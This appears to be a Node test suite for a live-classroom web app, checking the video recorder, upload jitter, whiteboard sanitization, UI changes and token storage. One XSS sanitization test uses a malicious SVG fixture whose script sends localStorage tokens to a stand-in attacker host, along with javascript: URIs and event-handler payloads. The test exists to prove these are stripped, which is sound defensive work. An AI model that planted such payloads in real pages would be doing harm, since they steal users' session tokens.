import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

import {
  RECORDER_CONFIG,
  PREFERRED_CODECS,
  getStrict720pMediaConstraints,
  selectSupportedMimeType,
  getRecorderOptions,
  computeRandomUploadJitterMs,
} from '../src/modules/live-classroom/hooks/useCompressedClassRecorder';

import {
  CurriculumClient,
  sanitizeWhiteboardPayloadForStorage,
  RelationalLessonContext,
} from '../src/modules/live-classroom/services/curriculumClient';

import * as ContentSyncMath from '../src/modules/live-classroom/utils/contentSyncMath';

describe('Phase 2 Unit & Integration Suite — 720p Recorder, Jitter, Multi-Topic Navigation & Rough Pad Removal', () => {
  describe('1. 720p Browser Hardware Encoder & Random Jitter Unit Tests', () => {
    it('enforces strict 1280x720 resolution and 15-20fps frameRate constraints', () => {
      const constraints = getStrict720pMediaConstraints();
      const video = constraints.video as MediaTrackConstraints;

      assert.deepEqual(video.width, { ideal: 1280, max: 1280 });
      assert.deepEqual(video.height, { ideal: 720, max: 720 });
      assert.deepEqual(video.frameRate, { ideal: 15, max: 20 });
    });

    it('cascades codec selection: vp9,opus -> avc1,mp4a -> vp8,opus -> video/webm', () => {
      // 1. Supports VP9 + Opus
      const mimeVp9 = selectSupportedMimeType((m) => m === 'video/webm;codecs=vp9,opus');
      assert.equal(mimeVp9, 'video/webm;codecs=vp9,opus');

      // 2. Fallback to H.264 + AAC (Safari / iOS)
      const mimeMp4 = selectSupportedMimeType((m) => m === 'video/mp4;codecs=avc1,mp4a');
      assert.equal(mimeMp4, 'video/mp4;codecs=avc1,mp4a');

      // 3. Fallback to VP8 + Opus
      const mimeVp8 = selectSupportedMimeType((m) => m === 'video/webm;codecs=vp8,opus');
      assert.equal(mimeVp8, 'video/webm;codecs=vp8,opus');

      // 4. Fallback to generic video/webm
      const mimeDefault = selectSupportedMimeType(() => false);
      assert.equal(mimeDefault, 'video/webm');
    });

    it('enforces 500 kbps video VBR and 48 kbps Opus audio bitrate caps', () => {
      const options = getRecorderOptions((m) => m === PREFERRED_CODECS[0]);
      assert.equal(options.mimeType, 'video/webm;codecs=vp9,opus');
      assert.equal(options.videoBitsPerSecond, 500_000);
      assert.equal(options.audioBitsPerSecond, 48_000);
      assert.equal(RECORDER_CONFIG.CHUNK_INTERVAL_MS, 10_000);
    });

    it('generates random chunk upload jitter strictly within [150ms, 1850ms] across 1,000 samples', () => {
      let minSeen = Infinity;
      let maxSeen = -Infinity;

      for (let i = 0; i < 1000; i++) {
        const jitter = computeRandomUploadJitterMs();
        assert.ok(
          jitter >= 150 && jitter <= 1850,
          `Jitter ${jitter}ms out of bounds [150, 1850]`
        );
        if (jitter < minSeen) minSeen = jitter;
        if (jitter > maxSeen) maxSeen = jitter;
      }

      // Deterministic boundary check
      assert.equal(computeRandomUploadJitterMs(150, 1850, () => 0), 150);
      assert.equal(computeRandomUploadJitterMs(150, 1850, () => 0.999999), 1850);
      assert.ok(maxSeen - minSeen > 1000, 'Jitter distribution spans wide range to prevent server spikes');
    });
  });

  describe('2. Strictly Two Stored Artifacts — Whiteboard Sanitization Unit Tests', () => {
    it('strips Content Mode pen/laser strokes and deleted Excalidraw elements before storage', () => {
      const dirtyPayload = {
        elements: [
          { id: 'el_rect_1', type: 'rectangle', x: 100, y: 120, isDeleted: false },
          { id: 'el_deleted_2', type: 'ellipse', x: 50, y: 50, isDeleted: true },
          { id: 'el_content_stroke', type: 'content_stroke', x: 10, y: 10 },
          { id: 'el_laser', type: 'laser_pointer', x: 20, y: 20 },
          { id: 'el_text_3', type: 'text', text: 'V = I * R', x: 200, y: 240 },
        ],
        appState: {
          viewBackgroundColor: '#ffffff',
          gridSize: 20,
          collaborators: new Map(),
        },
        files: { file_1: { id: 'file_1', mimeType: 'image/png' } },
        penStrokes: [{ id: 'stroke_1', points: [[1, 2]] }],
        contentStrokes: [{ id: 'stroke_2' }],
        laserPointer: { x: 100, y: 200, active: true },
      };

      const sanitized = sanitizeWhiteboardPayloadForStorage(dirtyPayload);

      assert.equal(sanitized.elements.length, 2);
      assert.deepEqual(
        sanitized.elements.map((e: any) => e.id),
        ['el_rect_1', 'el_text_3']
      );
      assert.equal((sanitized as any).penStrokes, undefined);
      assert.equal((sanitized as any).contentStrokes, undefined);
      assert.equal((sanitized as any).laserPointer, undefined);
      assert.equal(sanitized.appState.viewBackgroundColor, '#ffffff');
    });
  });

  describe('3. Student Rough Pad Removal & Light-Theme Multi-Topic UI Verification', () => {
    it('verifies Student Rough Pad tab & branch are removed from TopModeNavbar and LearningSessionLayout', () => {
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      // Rough Pad button & state branch must not exist
      assert.equal(navbarSource.includes('data-testid="mode-btn-roughpad"'), false);
      assert.equal(layoutSource.includes('key="student-rough-pad"'), false);
      assert.equal(layoutSource.includes("studentTab === 'roughpad'"), false);

      // New Phase 2 controls must be present
      assert.equal(navbarSource.includes('data-testid="teaching-mode-toggle-btn"'), true);
      assert.equal(navbarSource.includes('data-testid="recorder-status-pill"'), true);
    });
  });

  describe('4. End-to-End Frontend CurriculumClient <-> Mock Broadcast API Integration Test', () => {
    let mockServer: http.Server;
    let baseUrl: string;
    const receivedRequests: Array<{ method: string; url: string; headers: any; body: any }> = [];

    before(async () => {
      mockServer = http.createServer((req, res) => {
        const chunks: Buffer[] = [];
        req.on('data', (c) => chunks.push(c));
        req.on('end', () => {
          const rawBody = Buffer.concat(chunks);
          const contentType = req.headers['content-type'] || '';
          const parsedBody = contentType.includes('application/json')
            ? JSON.parse(rawBody.toString('utf8') || '{}')
            : rawBody;

          receivedRequests.push({
            method: req.method || 'GET',
            url: req.url || '/',
            headers: req.headers,
            body: parsedBody,
          });

          res.setHeader('Content-Type', 'application/json');

          if (req.url?.includes('/video-chunk')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                data: {
                  chunkIndex: Number(req.headers['x-chunk-index'] ?? 0),
                  bytesAppended: rawBody.length,
                },
              })
            );
            return;
          }

          if (req.url?.includes('/curriculum-navigate')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Segment logged',
                data: {
                  activeSegment: {
                    segmentIndex: receivedRequests.filter((r) =>
                      r.url.includes('/curriculum-navigate')
                    ).length,
                    chapterId: parsedBody.chapterId,
                    lessonId: parsedBody.lessonId,
                    topicId: parsedBody.topicId ?? null,
                    mode: parsedBody.mode,
                    startOffsetSec: parsedBody.videoOffsetSec,
                    endOffsetSec: null,
                    startedAtIso: new Date().toISOString(),
                    endedAtIso: null,
                  },
                  totalSegments: 2,
                  videoStorageKey:
                    'courses/course_12/board_2_lang_1/ch_10/lesson_101/v1_2026/video_720p.webm',
                },
              })
            );
            return;
          }

          if (req.url?.includes('/whiteboard-save')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Whiteboard saved',
                data: {
                  sessionId: 'sess_phase2_e2e',
                  lessonId: parsedBody.lessonId,
                  whiteboardStorageKey: `courses/course_12/board_2_lang_1/ch_${parsedBody.chapterId}/lesson_${parsedBody.lessonId}/v1_2026/whiteboard.json`,
                  compressedBytes: 256,
                  uncompressedBytes: 512,
                  elementsCount: parsedBody.elements?.length || 0,
                },
              })
            );
            return;
          }

          if (req.url?.includes('/finalize')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Session finalized',
                data: {
                  sessionId: 'sess_phase2_e2e',
                  totalDurationSec: parsedBody.totalDurationSec,
                },
              })
            );
            return;
          }

          res.writeHead(404);
          res.end(JSON.stringify({ message: 'Not found' }));
        });
      });

      await new Promise<void>((resolve) => {
        mockServer.listen(0, '127.0.0.1', () => {
          const addr = mockServer.address() as { port: number };
          baseUrl = `http://127.0.0.1:${addr.port}`;
          process.env.NEXT_PUBLIC_BROADCAST_API_URL = baseUrl;
          resolve();
        });
      });
    });

    after(async () => {
      await new Promise<void>((resolve) => mockServer.close(() => resolve()));
    });

    it('streams 720p chunks, navigates taught + reference_only lessons, saves sanitized whiteboard, and finalizes session', async () => {
      const sessionId = 'sess_phase2_e2e';
      const relContext: RelationalLessonContext = {
        sessionId,
        contextType: 'course_lesson',
        branchId: 4,
        batchId: 105,
        boardId: 2,
        languageId: 1,
        courseId: 12,
        linkedVodCourseId: 212,
        subjectId: 1,
        chapterId: 10,
        chapterNumber: 1,
        chapterTitle: 'Electrostatics',
        lessonId: 101,
        lessonNumber: '1.1',
        lessonTitle: 'Coulomb Law',
        topicId: 1001,
        teacherId: 501,
        academicYear: 2026,
        version: 1,
        publishToVodCourse: true,
        isPrimaryVod: true,
      };

      // 1. Upload Chunk #0 and Chunk #1
      const chunk0 = new Uint8Array([0x1a, 0x45, 0xdf, 0xa3, 0x11, 0x22]);
      const res0 = await CurriculumClient.uploadVideoChunk(sessionId, chunk0, {
        chunkIndex: 0,
        mimeType: 'video/webm;codecs=vp9,opus',
        relationalContext: relContext,
      });
      assert.equal(res0.success, true);
      assert.equal(res0.data.chunkIndex, 0);

      // 2. Teacher opens Lesson 99 in 'reference_only' mode at 300s (protects old VOD & WB)
      const navRefRes = await CurriculumClient.navigateCurriculum(sessionId, {
        chapterId: 9,
        lessonId: 99,
        topicId: 901,
        videoOffsetSec: 300,
        mode: 'reference_only',
        relationalContext: { ...relContext, lessonId: 99, publishToVodCourse: false },
      });
      assert.equal(navRefRes.success, true);
      assert.equal(navRefRes.data.activeSegment.mode, 'reference_only');
      assert.equal(navRefRes.data.activeSegment.startOffsetSec, 300);

      // 3. Teacher switches to Lesson 102 in 'taught' mode at 450s
      const navTaughtRes = await CurriculumClient.navigateCurriculum(sessionId, {
        chapterId: 10,
        lessonId: 102,
        topicId: 1002,
        videoOffsetSec: 450,
        mode: 'taught',
        relationalContext: { ...relContext, lessonId: 102, publishToVodCourse: true },
      });
      assert.equal(navTaughtRes.success, true);
      assert.equal(navTaughtRes.data.activeSegment.mode, 'taught');

      // 4. Save Whiteboard for taught lesson (verifying content_stroke is stripped)
      const wbRes = await CurriculumClient.saveWhiteboard(sessionId, {
        chapterId: 10,
        lessonId: 102,
        topicId: 1002,
        elements: [
          { id: 'wb_1', type: 'rectangle', x: 10, y: 20 },
          { id: 'bad_stroke', type: 'content_stroke', x: 0, y: 0 },
        ],
        relationalContext: relContext,
      });
      assert.equal(wbRes.success, true);
      assert.equal(wbRes.data.elementsCount, 1);

      // 5. Finalize Session on End Class
      const finRes = await CurriculumClient.finalizeSession(sessionId, {
        totalDurationSec: 900,
        relationalContext: relContext,
        whiteboard: {
          elements: [{ id: 'wb_final', type: 'arrow', x: 50, y: 60 }],
        },
      });
      assert.equal(finRes.success, true);
      assert.equal(finRes.data.totalDurationSec, 900);
    });
  });

  describe('5. P2-1: Stored XSS Sanitization for svgDiagram Before dangerouslySetInnerHTML', () => {
    it('strips <script>, <foreignObject>, inline on* event handlers, and javascript: URIs from svgDiagram while preserving valid SVG elements', () => {
      const sanitizeSvgMarkup = (ContentSyncMath as any).sanitizeSvgMarkup;
      assert.equal(
        typeof sanitizeSvgMarkup,
        'function',
        'sanitizeSvgMarkup must be exported from contentSyncMath.ts'
      );

      const maliciousSvg = `
        <svg viewBox="0 0 200 100" onload="alert('xss')" xmlns="http://www.w3.org/2000/svg">
          <script>fetch('https://attacker.tld/steal?t=' + localStorage.getItem('token'))</script>
          <foreignObject width="100" height="50">
            <iframe src="javascript:alert(1)"></iframe>
          </foreignObject>
          <a href="javascript:alert(2)" xlink:href="javascript:alert(3)">
            <circle cx="50" cy="50" r="40" stroke="#2563eb" fill="none" onerror="alert(4)" onclick="evil()" />
          </a>
          <path d="M 10 10 L 90 90" stroke="#1e293b" stroke-width="2" />
        </svg>
      `;

      const cleanSvg = sanitizeSvgMarkup(maliciousSvg);
      assert.equal(/<script/i.test(cleanSvg), false, '<script> tags must be stripped');
      assert.equal(/<foreignObject/i.test(cleanSvg), false, '<foreignObject> tags must be stripped');
      assert.equal(/\bon\w+\s*=/i.test(cleanSvg), false, 'Inline on* event handlers must be stripped');
      assert.equal(/javascript\s*:/i.test(cleanSvg), false, 'javascript: URIs must be neutralized');
      assert.equal(cleanSvg.includes('<circle'), true, 'Valid <circle> SVG element must be preserved');
      assert.equal(cleanSvg.includes('<path'), true, 'Valid <path> SVG element must be preserved');

      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      assert.equal(
        stageSource.includes('sanitizeSvgMarkup(block.svgDiagram)'),
        true,
        'VirtualContentStage.tsx must wrap block.svgDiagram with sanitizeSvgMarkup() before dangerouslySetInnerHTML'
      );
    });
  });

  describe('6. P2-4: Classroom JWT Stored in sessionStorage Instead of /rejoin URL Query String', () => {
    it('stores classroom JWT in sessionStorage(broadcast_rejoin_token) instead of leaking ?token= in /rejoin URLs', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const rejoinSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/RejoinScreen.tsx'),
        'utf8'
      );

      assert.equal(
        layoutSource.includes("sessionStorage.setItem('broadcast_rejoin_token'"),
        true,
        'LearningSessionLayout.tsx must persist token in sessionStorage before redirecting to /rejoin'
      );
      assert.equal(
        layoutSource.includes('...(token ? { token } : {})'),
        false,
        'LearningSessionLayout.tsx must not append raw token to /rejoin URL query parameters'
      );
      assert.equal(
        rejoinSource.includes("sessionStorage.getItem('broadcast_rejoin_token')"),
        true,
        'RejoinScreen.tsx must read broadcast_rejoin_token from sessionStorage'
      );
      assert.equal(
        rejoinSource.includes('...(token ? { token } : {})'),
        false,
        'RejoinScreen.tsx must not append raw token to / URL query parameters on rejoin'
      );
    });
  });

  describe('7. Goal Deliverables: Comic Sans Default Font, No Student Clear Button, Screen Wake Lock & Cross-Browser Support', () => {
    it('enforces Comic Sans (fontFamily: 5) as default whiteboard font and hides Clear button from students', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ExcalidrawStage.tsx'),
        'utf8'
      );
      const globalsCss = fs.readFileSync(
        path.resolve(__dirname, '../src/app/globals.css'),
        'utf8'
      );

      // 1. Default whiteboard font is 5 (Comic Sans / ComicShanns)
      assert.equal(
        stageSource.includes('export const DEFAULT_WHITEBOARD_FONT_FAMILY = 5'),
        true,
        'ExcalidrawStage.tsx must export DEFAULT_WHITEBOARD_FONT_FAMILY = 5 (Comic Sans)'
      );
      assert.equal(
        stageSource.includes('currentItemFontFamily: DEFAULT_WHITEBOARD_FONT_FAMILY'),
        true,
        'ExcalidrawStage initialData and scene updates must use DEFAULT_WHITEBOARD_FONT_FAMILY'
      );
      assert.equal(
        globalsCss.includes('Comic Sans MS'),
        true,
        'globals.css must include Comic Sans MS font stack for whiteboard rendering'
      );

      // 2. Clear button is restricted strictly to teacher (never shown to student on live classroom whiteboard)
      assert.equal(
        stageSource.includes("const canClearWhiteboard = isEditable && (role === 'teacher' || isRoughPad)"),
        true,
        'ExcalidrawStage.tsx must restrict Clear button to canClearWhiteboard (never shown to students on live whiteboard)'
      );
    });

    it('provides useScreenWakeLock hook and integrates it into LearningSessionLayout to prevent phone screen auto-off', () => {
      const wakeLockPath = path.resolve(
        __dirname,
        '../src/modules/live-classroom/hooks/useScreenWakeLock.ts'
      );
      assert.equal(
        fs.existsSync(wakeLockPath),
        true,
        'useScreenWakeLock.ts hook must exist'
      );

      const wakeLockSource = fs.readFileSync(wakeLockPath, 'utf8');
      assert.equal(
        wakeLockSource.includes("wakeLock.request('screen')"),
        true,
        'useScreenWakeLock must request W3C Screen Wake Lock API'
      );
      assert.equal(
        wakeLockSource.includes('visibilitychange'),
        true,
        'useScreenWakeLock must re-acquire wake lock on visibilitychange'
      );

      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      assert.equal(
        layoutSource.includes('useScreenWakeLock('),
        true,
        'LearningSessionLayout.tsx must activate useScreenWakeLock during live sessions'
      );
    });

    it('supports Chrome, Safari, Firefox, and Edge across MediaRecorder codecs, Fullscreen APIs, and Multi-Device Controls', () => {
      // 1. Safari generic video/mp4 fallback in PREFERRED_CODECS
      assert.equal(
        PREFERRED_CODECS.includes('video/mp4'),
        true,
        'PREFERRED_CODECS must include generic video/mp4 for Safari compatibility'
      );

      // 2. Fullscreen hook supports webkit, moz, and ms vendor prefixes
      const fsSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useFullscreenWorkspace.ts'),
        'utf8'
      );
      assert.equal(
        fsSource.includes('mozRequestFullScreen') && fsSource.includes('webkitRequestFullscreen'),
        true,
        'useFullscreenWorkspace.ts must support Safari webkit and Firefox moz prefixes'
      );

      // 3. TopModeNavbar includes Host Teacher per-student multi-device toggle
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      assert.equal(
        navbarSource.includes('multi-device-btn-'),
        true,
        'TopModeNavbar.tsx must render per-student multi-device toggle for the Host Teacher'
      );
    });

    it('synchronizes Whiteboard and Content scroll, camera, laser, and cursor bidirectionally across Host, Co-Host, and Students with board access', () => {
      const wbStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ExcalidrawStage.tsx'),
        'utf8'
      );
      const contentStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      // 1. ExcalidrawStage syncs incoming remote camera for all roles (not gated by role === 'student') and prevents self-echo via authorId + suppressRemoteCameraEchoUntilRef
      assert.equal(
        wbStageSource.includes('currentUserId && camera.authorId && camera.authorId === currentUserId') &&
          wbStageSource.includes('if (isEditable && isOwnCamera) return;'),
        true,
        'ExcalidrawStage must ignore self-authored camera updates while syncing remote camera updates to Host, Co-Host, and Students'
      );
      assert.equal(
        wbStageSource.includes('suppressRemoteCameraEchoUntilRef'),
        true,
        'ExcalidrawStage must suppress programmatic camera echoes when applying remote camera updates'
      );
      assert.equal(
        wbStageSource.includes('if (!effectiveIsHostTeacher || !isEditable || isRoughPad || !apiReady) return;'),
        true,
        'ExcalidrawStage must only broadcast initial camera on mount from the Host Teacher so joining Co-Hosts do not reset camera to (0,0)'
      );

      // 2. VirtualContentStage syncs incoming scroll and laser for all roles (Host, Co-Host, Student) and prevents programmatic scroll echo
      assert.equal(
        contentStageSource.includes('contentState.scrollAnchor.authorId === currentUserId') &&
          contentStageSource.includes('if (!followTeacher || (canAnnotate && isOwnScroll)) return;'),
        true,
        'VirtualContentStage must ignore self-authored scroll anchors while syncing remote scroll updates to Host, Co-Host, and Students'
      );
      assert.equal(
        contentStageSource.includes('if (isProgrammaticScrollRef.current) return;'),
        true,
        'VirtualContentStage handleScroll must not echo programmatic scroll updates back over the socket'
      );
      assert.equal(
        contentStageSource.includes('const isRemoteLaser =') &&
          contentStageSource.includes('laserPointer.authorId !== currentUserId'),
        true,
        'VirtualContentStage must render remote laser pointer and live cursor for all participants (Host, Co-Host, and Students)'
      );
    });
  });
});
